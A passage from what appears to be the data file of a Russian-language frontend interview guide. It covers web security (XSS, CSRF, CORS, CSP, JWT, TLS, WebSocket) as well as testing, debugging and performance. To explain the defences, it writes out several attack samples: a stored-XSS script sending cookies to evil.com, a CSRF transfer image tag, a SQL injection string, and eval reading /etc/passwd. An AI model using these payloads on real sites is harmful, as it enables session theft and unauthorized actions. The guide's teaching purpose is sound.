access token  → 15 мин, хранить in-memory
refresh token → 7 дней, хранить в httpOnly cookie
\`\`\`
\`\`\`js
// access истёк → отправляем refresh token:
POST /auth/refresh
Cookie: refresh_token=xyz  // браузер шлёт автоматически

// Сервер:
// 1. Проверяет refresh token (хэш в БД)
// 2. Выдаёт новый access token
// 3. Ротирует refresh token (старый инвалидируется)
Response: { accessToken: 'new_jwt' }
\`\`\`
Ротация refresh при каждом обновлении — если украли refresh, его использование сразу видно (старый уже невалиден).

---

**OAuth 2.0** — протокол делегированной авторизации. Позволяет дать приложению доступ к ресурсам пользователя без передачи пароля.

**Authorization Code + PKCE** — стандартный flow для SPA и мобильных:
\`\`\`
1. Редирект на OAuth-провайдер (Google, GitHub)
2. Пользователь логинится у провайдера → соглашается дать доступ
3. Провайдер редиректит обратно с code
4. Клиент меняет code на access token (+ PKCE проверка)
5. Используем access token для API
\`\`\`
PKCE (Proof Key for Code Exchange) — защита от перехвата code: клиент генерирует случайный code_verifier, шлёт его хэш при старте, и сам verifier при обмене.

**Client Credentials** — server-to-server, без пользователя:
\`\`\`
POST /oauth/token
{ client_id, client_secret, grant_type: 'client_credentials' }
→ access token
\`\`\`
Микросервисы, фоновые задачи, cron-джобы.

**Implicit flow** — устарел, небезопасен. Токен приходил прямо в URL — виден в логах, истории браузера. Заменён на Authorization Code + PKCE.`,score:4},{name:"npm audit. SCA и SAST",level:"2",content:`**Почему зависимости — зона риска:**
Типичное React-приложение тянет 500-1000 пакетов транзитивно. Уязвимость в любом из них — потенциальный вектор атаки. Атаки на supply chain (цепочку поставок) — один из главных векторов последних лет: атакуют не твой код, а пакет который ты используешь.

**npm audit:**
Сравнивает дерево зависимостей с базой CVE (Common Vulnerabilities and Exposures). Показывает уязвимость, severity (low/moderate/high/critical), и через какой пакет она попадает.
\`\`\`bash
npm audit                  # показать все уязвимости
npm audit --audit-level=high  # выйти с ошибкой только при high/critical
npm audit fix              # обновить уязвимые пакеты (только semver-совместимые)
npm audit fix --force      # обновить даже с breaking changes — опасно
\`\`\`
\`npm audit fix --force\` может сломать приложение — пакет обновится до мажорной версии с другим API. Делать только осознанно с последующим тестированием.

**SCA (Software Composition Analysis)** — автоматизированный анализ зависимостей на уязвимости и лицензионные проблемы:
• **npm audit** — встроен в npm, базовый уровень
• **Snyk** — глубже чем npm audit, находит уязвимости которые audit пропускает, интегрируется в CI
• **Dependabot (GitHub)** — автоматически создаёт PR для обновления уязвимых пакетов

SCA отвечает на вопрос: *есть ли известные уязвимости в том что я использую?*

**SAST (Static Application Security Testing)** — анализ твоего собственного кода без его запуска. Ищет потенциально опасные паттерны:
• **ESLint + eslint-plugin-security** — находит eval(), небезопасные регулярки, объекты без hasOwnProperty
• **SonarQube / SonarCloud** — глубокий анализ: SQL injection, XSS, hardcoded secrets
• **Semgrep** — кастомные правила под свой стек

SAST отвечает на вопрос: *есть ли уязвимый код в том что я написал?*

SCA + SAST вместе — разные слои защиты: один смотрит на чужой код, другой на твой.

---

**Что именно ищет SAST — типичные паттерны:**

**SQL-инъекция — конкатенация пользовательского ввода в запрос:**
\`\`\`sql
-- Запрос на сервере:
SELECT * FROM users WHERE name = '$input'

-- Пользователь вводит: ' OR '1'='1
-- Итоговый запрос:
SELECT * FROM users WHERE name = '' OR '1'='1'
-- Возвращает ВСЕХ пользователей
\`\`\`
Защита — параметризованные запросы (prepared statements). Значение передаётся отдельно от SQL-кода — база данных их никогда не смешивает:
\`\`\`js
// ❌ Конкатенация — уязвимо:
db.query(\`SELECT * FROM users WHERE name = '\${input}'\`);

// ✅ Параметризованный запрос — безопасно:
db.query('SELECT * FROM users WHERE name = ?', [input]);
// или с именованными параметрами (Postgres):
db.query('SELECT * FROM users WHERE name = $1', [input]);
\`\`\`

**Небезопасный eval с пользовательским вводом:**
\`\`\`js
// Пользователь передаёт строку:
const input = "require('fs').readFileSync('/etc/passwd')";
eval(input); // выполнит — прочитает системные файлы
\`\`\`
SAST видит \`eval(\` + переменная = потенциальная уязвимость. Никогда не передавать пользовательский ввод в eval.

**Захардкоженные секреты:**
\`\`\`js
// ❌ Плохо — секреты в коде:
const API_KEY = 'sk-1234567890abcdef'; // попадёт в git историю
const DB_PASSWORD = 'super_secret';

// ✅ Хорошо — через переменные окружения:
const API_KEY = process.env.API_KEY;
const DB_PASSWORD = process.env.DB_PASSWORD;
\`\`\`
SAST ищет паттерны \`password =\`, \`api_key =\`, \`secret =\`, токены в виде строк. Инструменты: truffleHog, git-secrets, GitHub secret scanning (встроен, сканирует автоматически при пуше).

**Если секрет уже попал в git — удаление из кода не помогает.** Git история хранит всё. Нужно: немедленно инвалидировать секрет (отозвать ключ/пересоздать пароль), и опционально почистить историю через \`git filter-repo\`.`,score:3},{name:"Атрибут rel: noreferrer, noopener, nofollow",level:"3",content:'**Проблема без этих атрибутов:**\nПри открытии ссылки в новой вкладке (`target="_blank"`) новая страница получает доступ к `window.opener` — ссылке на вкладку которая её открыла. Атакующий может написать:\n```js\n// На evil.com, куда вела ссылка с вашего сайта:\nwindow.opener.location = \'https://fake-login.com\';\n// Пользователь смотрит на новую вкладку, а оригинальный сайт\n// незаметно заменился на фишинговую копию — это tabnabbing\n```\n\n**noopener** — блокирует доступ к `window.opener`. Новая вкладка открывается в отдельном процессе без связи с оригинальной:\n```html\n<a href="https://external.com" target="_blank" rel="noopener">\n```\n\n**noreferrer** — делает то же что noopener, плюс не передаёт заголовок `Referer`. Referer — это URL страницы, с которой пришёл пользователь. Без него внешний сайт не узнает откуда пришёл переход:\n```\n// Без noreferrer внешний сайт видит:\nReferer: https://yoursite.com/secret-page\n\n// С noreferrer — заголовок отсутствует\n```\nНорма: всегда писать `rel="noopener noreferrer"` вместе для target="_blank".\n\n**nofollow** — не про безопасность, а про SEO. Указание поисковым роботам не передавать «ссылочный вес» (PageRank) на эту страницу:\n```html\n<!-- Пользовательский контент, платные ссылки, недоверенные источники: -->\n<a href="https://sponsor.com" rel="nofollow">Реклама</a>\n```\nГугл требует nofollow для платных/рекламных ссылок — иначе это манипуляция поисковой выдачей.',score:3},{name:"CSP и X-Frame-Options",level:"3",content:`**CSP (Content Security Policy)** — HTTP-заголовок, который говорит браузеру откуда разрешено загружать ресурсы. Это второй рубеж защиты от XSS: даже если атакующий внедрил скрипт, браузер его не выполнит если домен не в белом списке.

**Почему нужен второй рубеж:**
Фильтрация и экранирование на сервере — первый рубеж. Но программисты делают ошибки. CSP — страховка: даже при пробитом первом рубеже инжектированный скрипт не запустится.

**Основные директивы:**
\`\`\`
Content-Security-Policy:
  default-src 'self';                    // по умолчанию — только свой домен
  script-src 'self' cdn.example.com;    // скрипты — свой домен + cdn
  style-src 'self' 'unsafe-inline';     // стили — свой домен + inline (нежелательно)
  img-src 'self' data: https:;          // картинки — свой домен + data URI + любой HTTPS
  connect-src 'self' api.example.com;  // fetch/XHR — свой домен + API
  font-src 'self' fonts.gstatic.com;   // шрифты
  frame-ancestors 'none';              // запрет встраивания в iframe (замена X-Frame-Options)
\`\`\`

**Inline-скрипты по умолчанию запрещены** — это ключевая защита. \`<script>alert(1)<\/script>\` из XSS не выполнится.

Если нужны inline-скрипты (React/Vite часто генерируют) — использовать nonce:
\`\`\`html
<!-- Сервер генерирует случайный nonce при каждом запросе -->
<script nonce="r4nd0m123">...<\/script>
\`\`\`
\`\`\`
Content-Security-Policy: script-src 'nonce-r4nd0m123';
\`\`\`

**Report-Only режим** — не блокирует, только сообщает о нарушениях. Используют для тестирования CSP перед включением:
\`\`\`
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
\`\`\`

**X-Frame-Options** — запрещает встраивание сайта в \`<iframe>\`. Защита от **clickjacking**: атакующий встраивает твой сайт в прозрачный iframe поверх своей страницы — пользователь думает что кликает по кнопке на чужом сайте, а на самом деле нажимает кнопку на твоём (например "Перевести деньги"):
\`\`\`
X-Frame-Options: DENY          // нельзя встроить нигде
X-Frame-Options: SAMEORIGIN    // только на своём домене
\`\`\`
Современная альтернатива: \`frame-ancestors\` директива в CSP — гибче, поддерживает несколько доменов.`,score:3.5},{name:"CORS",level:"3",content:`**Зачем вообще существует Same-Origin Policy:**
Браузер по умолчанию запрещает JS на одном домене читать ответы с другого. Без этого любой сайт мог бы в фоне делать запросы от твоего имени — читать почту, банковский счёт, отправлять формы. CORS — механизм, позволяющий серверу явно разрешить доступ с конкретных доменов.

**Origin = протокол + домен + порт.** Разные origin:
\`\`\`
https://site.com  vs  http://site.com    // разный протокол
https://site.com  vs  https://api.com    // разный домен
https://site.com  vs  https://site.com:8080  // разный порт
\`\`\`

**Простые запросы** (GET, POST с обычными заголовками) — браузер шлёт запрос с заголовком Origin, сервер отвечает с Access-Control-Allow-Origin. Если домен не совпадает — браузер блокирует чтение ответа (запрос дошёл до сервера, браузер просто не даёт JS прочитать результат).

**Preflight (предварительный запрос)** — для "сложных" запросов (PUT, DELETE, PATCH, кастомные заголовки типа Authorization): браузер сначала шлёт OPTIONS, спрашивая разрешение, и только при положительном ответе шлёт настоящий запрос:
\`\`\`
// Браузер автоматически:
OPTIONS /api/users
Origin: https://frontend.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization

// Сервер должен ответить:
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: Authorization
Access-Control-Max-Age: 86400  // кэшировать preflight на сутки
\`\`\`

**CORS с credentials — куки и Authorization через домены:**
По умолчанию браузер не отправляет куки на другой домен даже если CORS разрешён. Нужно явно включить с обеих сторон:
\`\`\`js
// Клиент — явно указать credentials:
fetch('https://api.site.com/data', {
  credentials: 'include', // отправлять куки!
});

// Или axios:
axios.get('https://api.site.com/data', {
  withCredentials: true,
});
\`\`\`
\`\`\`
// Сервер ОБЯЗАН ответить двумя заголовками:
Access-Control-Allow-Origin: https://mysite.com  // НЕ может быть *!
Access-Control-Allow-Credentials: true
\`\`\`
\`Access-Control-Allow-Origin: *\` + \`credentials: include\` — браузер заблокирует запрос. Это намеренное ограничение.

**Почему * нельзя с credentials — связь с CSRF:**
Если бы \`*\` работал с credentials, любой сайт мог бы делать запросы от имени пользователя с его куками. Это открыло бы дверь для CSRF-атак в обход SameSite-защиты. Требование конкретного домена означает что сервер осознанно доверяет именно этому источнику.

**CORS — это защита браузера, не сервера.** Curl или Postman не соблюдают CORS — они просто шлют запросы. CORS защищает от атак через браузер пользователя, не от прямых запросов к API.`,score:3.5},{name:"XSS",level:"3",content:"**XSS (Cross-Site Scripting)** — атака при которой вредоносный JS выполняется в браузере жертвы в контексте доверенного сайта. Атакующий получает те же права что и сам сайт: читает куки, localStorage, делает запросы от имени пользователя, меняет DOM.\n\n**Stored XSS (хранимый)** — скрипт сохраняется в БД и показывается всем пользователям:\n```\nАтакующий пишет комментарий: <script>fetch('evil.com?c='+document.cookie)<\/script>\nСервер сохраняет это в БД.\nДругой пользователь открывает страницу → браузер выполняет скрипт → куки улетают.\n```\nСамый опасный тип — автоматически поражает всех посетителей.\n\n**Reflected XSS (отражённый)** — скрипт передаётся в URL и сервер отражает его обратно в HTML:\n```\nhttps://site.com/search?q=<script>alert(1)<\/script>\nСервер: <h1>Результаты для: <script>alert(1)<\/script></h1>\n```\nЖертву нужно заставить перейти по специально сформированной ссылке (фишинг, спам).\n\n**DOM-based XSS** — сервер не при делах, уязвимость в клиентском JS:\n```js\n// Берём значение из URL и суём в DOM без проверки:\nconst name = location.hash.slice(1);\ndocument.getElementById('greeting').innerHTML = 'Привет, ' + name;\n// URL: https://site.com/page#<img src=x onerror=alert(1)>\n```\nОпасные источники: `location.hash`, `location.search`, `document.referrer`.\nОпасные получатели: `innerHTML`, `outerHTML`, `document.write`, `eval`.\n\n**Как React защищает по умолчанию:**\nJSX экранирует всё что выводится через `{}`. `<` превращается в `&lt;`, `>` в `&gt;` и т.д. — строка рендерится как текст, не как HTML:\n```jsx\nconst userInput = '<script>alert(1)<\/script>';\n<div>{userInput}</div>\n// В DOM: <div>&lt;script&gt;alert(1)&lt;/script&gt;</div> — безопасно\n```\n\n**Где React НЕ защищает:**\n```jsx\n// dangerouslySetInnerHTML — вставляет HTML как есть:\n<div dangerouslySetInnerHTML={{ __html: userInput }} /> // ❌\n\n// href с javascript: — выполнится при клике:\n<a href={userUrl}>link</a> // если userUrl = 'javascript:alert(1)' — ❌\n// Защита: проверять что href начинается с https://, не с javascript:\n```\n\n**Полная защита:**\n• React JSX — включена по умолчанию\n• Санитизация через DOMPurify перед dangerouslySetInnerHTML\n• CSP заголовок — запрещает inline-скрипты и внешние домены\n• HttpOnly cookies — украденные через XSS куки нельзя прочитать через JS\n• Валидация href/src атрибутов если они из пользовательских данных",score:3.5},{name:"CSRF",level:"3",content:`**CSRF (Cross-Site Request Forgery)** — атака при которой браузер жертвы отправляет запрос на доверенный сайт от её имени, без её ведома.

**Почему это работает — браузер автоматически шлёт куки:**
\`\`\`
1. Пользователь залогинен на bank.com (в браузере есть cookie с сессией)
2. Пользователь заходит на evil.com
3. evil.com содержит:
   <img src="https://bank.com/transfer?to=attacker&amount=10000">
   или форму которая автоматически сабмитится через JS
4. Браузер делает запрос на bank.com — и автоматически прикрепляет cookie
5. Банк видит валидную сессию и выполняет перевод
\`\`\`
Пользователь ничего не нажимал — браузер сделал всё сам.

**Защита 1 — CSRF-токен:**
Сервер генерирует уникальный случайный токен, кладёт его в форму (скрытое поле) и в сессию. При запросе сравнивает. Атакующий не знает этот токен — не может сформировать валидный запрос:
\`\`\`html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="r4nd0m_s3cr3t">
  ...
</form>
\`\`\`

**Защита 2 — SameSite cookie:**
Атрибут куки, указывающий браузеру когда слать куки в кросс-доменных запросах:
\`\`\`
SameSite=Strict  — куки шлются ТОЛЬКО при навигации с того же домена.
                   Даже переход по ссылке с другого сайта не пришлёт куки.
                   Ломает OAuth-редиректы — редко используют для session cookie.

SameSite=Lax     — куки шлются при навигации (ссылки, адресная строка),
                   но НЕ при автоматических запросах (img, form POST, XHR).
                   Дефолт в современных браузерах. Хороший баланс.

SameSite=None    — куки шлются всегда. Требует Secure (только HTTPS).
                   Для третьесторонних куки (трекинг, виджеты).
\`\`\`
Lax защищает от большинства CSRF-атак — форма на evil.com, сабмитящаяся в bank.com, не получит куки.

**Защита 3 — проверка Origin/Referer заголовка:**
Сервер проверяет откуда пришёл запрос. Если Origin не совпадает с доверенным доменом — отклоняет.

**Почему JWT в Authorization header защищает от CSRF:**
Браузер автоматически шлёт только куки. Authorization header атакующий из кросс-доменного запроса добавить не может — для этого нужен JS, а JS заблокирует CORS. Поэтому API с токеном в заголовке CSRF-безопасны без дополнительных мер.`,score:3.5},{name:"Безопасность JWT",level:"3",content:`**JWT (JSON Web Token)** — три части через точку: \`header.payload.signature\`, каждая в Base64.
\`\`\`
eyJhbGciOiJIUzI1NiJ9  ← header: { alg: "HS256" }
.eyJ1c2VySWQiOjQyfQ    ← payload: { userId: 42, exp: 1716000000 }
.SflKxwRJSMeKKF2QT4fw  ← подпись (HMAC SHA256 от header+payload с секретным ключом)
\`\`\`

**JWT не шифрует — только подписывает.** Payload декодируется любым base64-декодером без ключа. Не класть в payload: пароли, секреты, персональные данные которые не должны видеть клиенты.

**Атака: alg=none:**
Оригинальная уязвимость JWT. Атакующий меняет алгоритм в header на \`none\` и убирает подпись — некоторые библиотеки принимали такой токен как валидный:
\`\`\`js
// Уязвимая проверка:
jwt.verify(token); // не указан алгоритм

// Безопасная:
jwt.verify(token, secret, { algorithms: ['HS256'] }); // явно указать алгоритм
\`\`\`

**Атака: алгоритм confusion (RS256 → HS256):**
Асимметричный RS256 использует пару: приватный ключ для подписи, публичный для проверки. Публичный ключ — публичный по определению. Атакующий меняет алгоритм на симметричный HS256 и подписывает токен публичным ключом как HMAC-секретом. Уязвимая библиотека проверяет его тем же публичным ключом и принимает.

Защита: всегда явно указывать ожидаемый алгоритм.

**Нельзя мгновенно инвалидировать:**
JWT stateless — сервер не хранит список токенов. Если украли access token — он работает до exp. Решения:
• Короткий срок жизни (15 мин) — украденный токен быстро протухнет
• Blacklist (список отозванных jti) — нарушает stateless, но даёт мгновенную инвалидацию
• Версия в токене — при логауте инкрементировать версию в БД, проверять при запросах

**Где хранить (повторение из темы Auth, ключевое):**
\`\`\`
localStorage  — читается JS → украдут через XSS ❌
Cookie без httpOnly — то же самое ❌
httpOnly cookie — JS не читает, CSRF защищён SameSite=Lax ✅
in-memory (переменная) — исчезает при перезагрузке, самое безопасное ✅
\`\`\`

**Когда JWT лучше session:**
Микросервисы — каждый сервис проверяет подпись локально без запроса к хранилищу сессий. Горизонтальное масштабирование — не нужен общий Redis.`,score:3.5},{name:"Работа SSL/TLS",level:"4",content:`**TLS (Transport Layer Security)** — протокол шифрования соединения. SSL — его устаревший предшественник, название часто используют как синоним хотя SSL давно не применяется.

**Зачем нужен TLS:**
Без шифрования все данные передаются в открытом виде. Любой узел на пути (провайдер, роутер, публичный Wi-Fi) может прочитать или подменить их. MITM (Man-in-the-Middle, "человек посередине") — атакующий встаёт между клиентом и сервером, перехватывает и при желании изменяет трафик. Обе стороны думают что говорят напрямую.

TLS решает три задачи:
• **Шифрование** — данные нечитаемы для третьих лиц
• **Аутентификация сервера** — клиент уверен что говорит именно с bank.com, а не с подменой
• **Целостность** — данные не изменены в пути. Проверяется через MAC (Message Authentication Code) — криптографическая контрольная сумма сообщения

**TLS Handshake — как устанавливается защищённое соединение (TLS 1.3):**
\`\`\`
1. ClientHello
   Клиент → сервер: список поддерживаемых алгоритмов шифрования,
   случайное число (client random)

2. ServerHello + Certificate + Key Exchange
   Сервер → клиент: выбранный алгоритм, свой публичный ключ
   для обмена по алгоритму Диффи-Хеллмана, сертификат

3. Клиент проверяет сертификат:
   - Подпись валидна? (доверяем CA из системного хранилища)
   - Домен совпадает? Смотрим CN (Common Name — поле с доменом)
     или SAN (Subject Alternative Name — список альтернативных доменов,
     например *.example.com)
   - Не истёк? (срок действия)

4. Обмен ключами по алгоритму Диффи-Хеллмана (DH):
   Клиент и сервер каждый генерируют свою пару ключей,
   обмениваются публичными частями и независимо вычисляют
   один и тот же сессионный ключ — не передавая его по сети.
   Математика устроена так что зная только публичные части
   вычислить ключ третьей стороне практически невозможно.

5. Всё дальнейшее шифруется сессионным ключом
   алгоритмом AES (Advanced Encryption Standard) —
   симметричный блочный шифр, стандарт индустрии
\`\`\`
TLS 1.3 — 1 RTT (Round Trip Time, одно время туда-обратно) вместо 2 у TLS 1.2. Соединение устанавливается быстрее.

**Сертификаты и цепочка доверия:**
Сертификат содержит: домен, публичный ключ сервера, подпись выдавшего CA.
CA (Certificate Authority) — организация-удостоверяющий центр, чьи корневые сертификаты встроены в ОС и браузеры. Браузер им доверяет изначально.

Цепочка: Root CA (встроен в систему) → Intermediate CA (промежуточный) → Сертификат сайта. Браузер идёт по цепочке и проверяет каждую подпись.

Let's Encrypt — бесплатный CA, выдаёт сертификаты автоматически через ACME-протокол (Automated Certificate Management Environment — стандартный протокол для автоматического получения и обновления сертификатов). Certbot — популярный ACME-клиент.

**HSTS (HTTP Strict Transport Security)** — заголовок который браузер запоминает:
\`\`\`
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
\`\`\`
После первого получения браузер год (31536000 секунд) будет автоматически открывать этот домен по HTTPS, игнорируя http://. Защита от SSL stripping — атаки где злоумышленник перехватывает первый HTTP-запрос до редиректа на HTTPS и держит жертву на незашифрованном соединении.`,score:3.5},{name:"Организация безопасности при реализации WebSocket-ов",level:"4",content:`**Чем WebSocket отличается от HTTP с точки зрения безопасности:**
WebSocket — persistent-соединение (постоянное, не закрывается после ответа). После установки handshake (HTTP Upgrade → WebSocket) между клиентом и сервером открыт постоянный двусторонний канал. Это меняет модель угроз: атакующий может влиять не на один запрос, а на весь поток сообщений на протяжении сессии.

**Угроза 1 — CSWSH (Cross-Site WebSocket Hijacking, межсайтовый перехват WebSocket):**
Аналог CSRF для WebSocket. WebSocket-handshake — это обычный HTTP-запрос, и браузер автоматически прикрепляет к нему куки. Атакующий с evil.com может открыть WebSocket-соединение с victim.com от имени залогиненной жертвы:
\`\`\`js
// Код на evil.com:
const ws = new WebSocket('wss://victim.com/ws');
// Браузер прикрепит куки жертвы к handshake-запросу
ws.onmessage = (e) => sendToAttacker(e.data); // читает приватные данные жертвы
\`\`\`

**Защита от CSWSH — проверка заголовка Origin при handshake:**
\`\`\`js
// Сервер при обработке WebSocket upgrade-запроса:
const origin = request.headers['origin'];
const allowedOrigins = ['https://mysite.com', 'https://app.mysite.com'];

if (!allowedOrigins.includes(origin)) {
  socket.destroy(); // отклонить соединение
  return;
}
\`\`\`
Origin — это заголовок который браузер выставляет сам и не позволяет JS его подделать. С curl или Postman можно выставить любой Origin — но это атаки не из браузера, там нет куки жертвы.

**Угроза 2 — отсутствие аутентификации:**
WebSocket сам по себе не имеет встроенной аутентификации. Проверять кто подключается нужно явно. Три подхода:
\`\`\`js
// Вариант 1 — токен в URL (не рекомендуется: токен попадает в логи сервера):
new WebSocket('wss://api.com/ws?token=eyJhbGc...');

// Вариант 2 — первым сообщением сразу после подключения:
ws.onopen = () => {
  ws.send(JSON.stringify({ type: 'auth', token: getAccessToken() }));
};
// Сервер ждёт auth-сообщение, при неверном токене — закрывает соединение
// Другие сообщения до аутентификации игнорировать!

// Вариант 3 — httpOnly cookie + проверка Origin (если сессия в куки)
// Origin защищает от CSWSH, cookie передаётся браузером автоматически
\`\`\`

**Угроза 3 — инъекции через входящие сообщения:**
Все данные от клиента — потенциально вредоносные. WebSocket не ограничивает формат сообщений — можно слать что угодно:
\`\`\`js
ws.on('message', (raw) => {
  let msg;
  try {
    msg = JSON.parse(raw);
  } catch {
    ws.close(1003, 'Invalid format'); // 1003 — unsupported data
    return;
  }

  // Проверить схему: ожидаемые поля, типы, длину строк
  if (!isValidMessage(msg)) {
    ws.close(1008, 'Policy violation');
    return;
  }

  // Дальше работать только с проверенными данными
  // Не передавать в eval, innerHTML, SQL без обработки
});
\`\`\`

**Угроза 4 — flood (флуд) / DDoS (Distributed Denial of Service — распределённая атака отказа в обслуживании):**
Один клиент может отправлять тысячи сообщений в секунду, перегружая сервер. Rate limiting (ограничение частоты) на уровне соединения:
\`\`\`js
// Простой rate limiter: не более 10 сообщений в секунду
const msgCount = new Map(); // connectionId → count

ws.on('message', (data) => {
  const count = (msgCount.get(ws.id) ?? 0) + 1;
  msgCount.set(ws.id, count);
  if (count > 10) {
    ws.close(1008, 'Rate limit exceeded');
    return;
  }
  // Сбрасывать счётчик каждую секунду
});
\`\`\`

**WSS (WebSocket Secure)** — WebSocket поверх TLS (аналог HTTPS для WebSocket). Всегда использовать в продакшне: шифрует весь канал, защищает от перехвата и подмены сообщений в пути. \`ws://\` — открытый текст, \`wss://\` — зашифровано.`,score:3.5}]},{id:"testing",title:"ТЕСТИРОВАНИЕ",icon:"🧪",color:"#26A69A",topics:[{name:"Паттерн AAA (Arrange Act Assert)",level:"2",content:`\`\`\`js
// Arrange — подготовка
const calculator = new Calculator();

// Act — действие
const result = calculator.add(2, 3);

// Assert — проверка
expect(result).toBe(5);
\`\`\`

Каждый тест — одно действие, одна проверка. Чистый и читаемый.`},{name:"Моки. Зачем нужны и как применять",level:"3",content:`**Mock** — подделка зависимости с контролируемым поведением.

\`\`\`js
const mockFetch = jest.fn().mockResolvedValue({ json: () => ({ name: 'Alice' }) });
global.fetch = mockFetch;

await loadUser();

expect(mockFetch).toHaveBeenCalledWith('/api/user');
\`\`\`

Зачем: изоляция тестируемого кода, предсказуемость, скорость (не ждём реальный API).`},{name:"Stub, Spy. Зачем нужны и как применять",level:"3",content:`**Stub** — заглушка, возвращающая фиксированное значение. Не проверяем вызов.
\`\`\`js
const getUser = jest.fn().mockReturnValue({ name: 'Alice' });
\`\`\`

**Spy** — наблюдатель, следит за вызовами реального метода без подмены:
\`\`\`js
const spy = jest.spyOn(console, 'log');
doSomething();
expect(spy).toHaveBeenCalledWith('done');
spy.mockRestore();
\`\`\`

**Mock** = Stub + Spy (подменяет и отслеживает).`},{name:"Принцип TDD",level:"3",content:`**TDD (Test-Driven Development):**
1. **Red** — пишем тест → он падает (функционал не реализован)
2. **Green** — пишем минимальный код, чтобы тест прошёл
3. **Refactor** — улучшаем код, тесты продолжают проходить

Преимущества: лучший дизайн кода, высокое покрытие, документация через тесты, уверенность при рефакторинге.`},{name:"Интеграционные и e2e тесты (cypress / playwright)",level:"3",content:`**Unit** — одна функция/компонент в изоляции.
**Интеграционные** — несколько модулей вместе (API + компонент).
**E2E** — полный пользовательский сценарий в реальном браузере.

**Cypress:** JS-фреймворк, работает в браузере, time-travel debugging, автоматические ожидания.
**Playwright:** от Microsoft, мультибраузерный (Chromium, Firefox, WebKit), быстрее, API для мобильных.`},{name:"Пирамида тестирования, инструменты для каждого уровня",level:"3",content:`\`\`\`
       /  E2E  \\       — мало, медленные, дорогие
      / Integration \\   — средне
     /    Unit       \\  — много, быстрые, дешёвые
\`\`\`

**Unit:** Jest, Vitest, React Testing Library
**Integration:** Jest + MSW (Mock Service Worker), Supertest
**E2E:** Cypress, Playwright

**Перевёрнутая пирамида** — антипаттерн: много E2E, мало Unit. Медленные, хрупкие тесты.`},{name:"Coverage. Инструменты и принцип работы",level:"4",content:`**Coverage** — процент кода, выполненного при прогоне тестов.

**Метрики:**
• **Statements** — % выполненных выражений
• **Branches** — % пройденных ветвлений (if/else, switch)
• **Functions** — % вызванных функций
• **Lines** — % выполненных строк

**Инструменты:** istanbul/nyc, Jest --coverage, Vitest --coverage, c8.

**Важно:** 100% coverage ≠ качественные тесты. Можно покрыть всё без проверки правильности. Coverage — метрика полноты, не качества.`},{name:"Unit тестирование",level:"2",content:`Тестирование отдельной функции/компонента в изоляции.

**React Testing Library:**
\`\`\`js
render(<Button label="Click" onClick={mockFn} />);
const btn = screen.getByText('Click');
fireEvent.click(btn);
expect(mockFn).toHaveBeenCalled();
\`\`\`

Принцип: тестируй поведение, не реализацию. Query по тексту/роли, не по className.`}]},{id:"exceptions",title:"ОБРАБОТКА ИСКЛЮЧЕНИЙ, ЛОГИРОВАНИЕ, ДЕБАГ",icon:"🐛",color:"#FF7043",topics:[{name:"try-catch",level:"2",content:`\`\`\`js
try {
  riskyOperation();
} catch (error) {
  console.error(error.message);
} finally {
  cleanup(); // всегда выполняется
}
\`\`\`

**finally** — выполняется всегда (и при ошибке, и без).

**Не ловит:** асинхронные ошибки (setTimeout, Promise). Для промисов — .catch() или try/catch с await.

**Custom Error:**
\`\`\`js
class ValidationError extends Error {
  constructor(message, field) {
    super(message);
    this.name = 'ValidationError';
    this.field = field;
  }
}
\`\`\``},{name:"Способы дебага клиентского кода",level:"2",content:`• **console.log/warn/error/table/group/time** — базовое логирование
• **debugger** — программный breakpoint
• **DevTools breakpoints** — line, conditional, DOM, XHR, event
• **Source maps** — маппинг минифицированного кода на исходный
• **Network tab** — анализ запросов и ответов
• **Performance tab** — профилирование
• **React DevTools** — дерево компонентов, props, state, profiler`},{name:"redux/react/альтернативы devtools",level:"3",content:`**React DevTools:** дерево компонентов, props, state, hooks, profiler (перерендеры), highlight updates.

**Redux DevTools:** time-travel debugging, просмотр всех actions и state diff, импорт/экспорт состояния.

**Vue DevTools, MobX DevTools, Zustand DevTools** — аналогичные инструменты для своих экосистем.`},{name:"Настройка логирования ошибок (sentry, prometheus и др.)",level:"4",content:`**Sentry** — мониторинг ошибок в реальном времени:
• Автоматический перехват ошибок (window.onerror, unhandledrejection)
• Source maps для читаемых stack traces
• Breadcrumbs — цепочка действий перед ошибкой
• Release tracking — привязка ошибок к версиям
• Performance monitoring

**Prometheus + Grafana** — метрики (больше для backend/инфраструктуры).

**LogRocket / FullStory** — session replay + логирование.`},{name:"Понимание принципа выделения программных узлов для логирования",level:"4",content:`**Что логировать:**
• API-вызовы (запрос, ответ, ошибки)
• Действия пользователя (навигация, клики на ключевые элементы)
• Ошибки рендеринга (ErrorBoundary)
• Бизнес-логика (переходы состояний, транзакции)
• Производительность (долгие операции, медленные рендеры)

**Уровни логирования:** debug, info, warn, error, fatal.

**Не логировать:** чувствительные данные (пароли, токены, персональные данные — GDPR!).`}]},{id:"perf",title:"ПРОИЗВОДИТЕЛЬНОСТЬ",icon:"🚀",color:"#FFC107",topics:[{name:"Инструменты проверки производительности (devtools, lighthouse)",level:"2",content:`**Lighthouse:** аудит Performance, Accessibility, SEO, Best Practices. Даёт оценку 0-100 и рекомендации.

**DevTools Performance tab:** запись и анализ. Flame chart — визуализация стека вызовов. Main thread — видно что блокирует.

**WebPageTest** — тестирование из разных локаций и устройств.
**Chrome UX Report** — реальные данные пользователей.`},{name:"Preload, prefetch, async, defer",level:"2",content:'**Scripts:**\n```html\n<script src="app.js"><\/script>           <!-- блокирует парсинг -->\n<script src="app.js" async><\/script>     <!-- загружает параллельно, выполняет сразу -->\n<script src="app.js" defer><\/script>     <!-- загружает параллельно, выполняет после парсинга -->\n```\n\n**Resource hints:**\n```html\n<link rel="preload" href="font.woff2" as="font">   <!-- загрузить сейчас (критический ресурс) -->\n<link rel="prefetch" href="next-page.js">           <!-- загрузить потом (для будущей навигации) -->\n<link rel="preconnect" href="https://api.com">      <!-- установить соединение заранее -->\n```'},{name:"Метрики клиентской производительности",level:"3",content:`**Core Web Vitals:**
• **LCP (Largest Contentful Paint)** — время отрисовки самого большого элемента. Хорошо: < 2.5s
• **FID (First Input Delay)** / **INP (Interaction to Next Paint)** — задержка реакции на ввод. Хорошо: < 100ms
• **CLS (Cumulative Layout Shift)** — визуальная стабильность (прыжки элементов). Хорошо: < 0.1

**Другие:**
• **FCP (First Contentful Paint)** — первый контент на экране
